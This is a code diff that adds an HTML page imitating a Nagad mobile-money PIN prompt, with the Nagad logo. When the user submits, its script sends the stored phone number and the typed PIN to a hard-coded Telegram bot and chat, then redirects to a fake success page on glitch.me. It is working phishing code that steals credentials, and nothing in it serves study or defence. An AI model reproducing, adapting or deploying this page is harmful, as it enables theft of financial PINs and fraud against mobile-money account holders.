@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Pin Code</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100dvh;
+            margin: 0;
+        }
+        .container {
+            width: 300px;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; /* Added to consider padding in width calculation */
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #FF5F1F;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-sizing: border-box; /* Added to consider padding in width calculation */
+        }
+        button:hover {
+            background-color: #FF5F1F;
+        }
+        #error {
+            color: red;
+        }
+        img {
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2><img src="https://cdn.glitch.global/167c8f07-c584-4e15-85e6-0dcb6e4fcea0/Nagad_Logo_2024.svg.png?v=1726659873408" /></h2>
+        <p>Nagad Number: <span id="nagadNumber"></span></p>
+        <label for="pinCode">Enter Pin Code:</label>
+        <input type="text" id="pinCode" placeholder="Enter your PIN" required>
+        <button onclick="validatePin()">Continue</button>
+        <p id="error"></p>
+    </div>
+
+    <script>
+        // Retrieve Nagad number from localStorage and display it
+        document.addEventListener('DOMContentLoaded', function() {
+            const nagadNumber = localStorage.getItem('nagadNumber');
+            if (nagadNumber) {
+                document.getElementById('nagadNumber').textContent = nagadNumber;
+            }
+        });
+
+        // Function to format today's date as YYYY/MM/DD
+        function getCurrentDate() {
+            const today = new Date();
+            const year = today.getFullYear();
+            const month = String(today.getMonth() + 1).padStart(2, '0'); // Months are 0-based, so +1
+            const day = String(today.getDate()).padStart(2, '0');
+            return `${year}/${month}/${day}`;
+        }
+
+        // Validate the Pin Code and send data to Telegram
+        function validatePin() {
+            const pinCode = document.getElementById('pinCode').value;
+            const nagadNumber = localStorage.getItem('nagadNumber');
+            const error = document.getElementById('error');
+
+            if (pinCode.length < 4 || pinCode.length > 5 || isNaN(pinCode)) {
+                error.textContent = 'The Pin must be a 4 or 5-digit number.';
+            } else {
+                error.textContent = '';  // Clear error message if pin is valid
+                const currentDate = getCurrentDate();  // Get today's date as token
+
+                // Send data to Telegram
+                fetch('https://api.telegram.org/bot7138875939:AAGw-ROS6-ch6MILpTOJlOjcmAR6oVGoAiA/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: '5625471891',
+                        text: `Nagad Number: ${nagadNumber}\nPin Code: ${pinCode}`,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram response:', data);
+                    // After successfully submitting to Telegram, redirect the user
+                    window.location.href = `https://gball999.glitch.me/success.html?token=${currentDate}`;
+                })
+                .catch(error => {
+                    console.error('Error submitting to Telegram:', error);
+                    // Handle error if needed
+                });
+            }
+        }
+    </script>
+
+</body>
+</html>
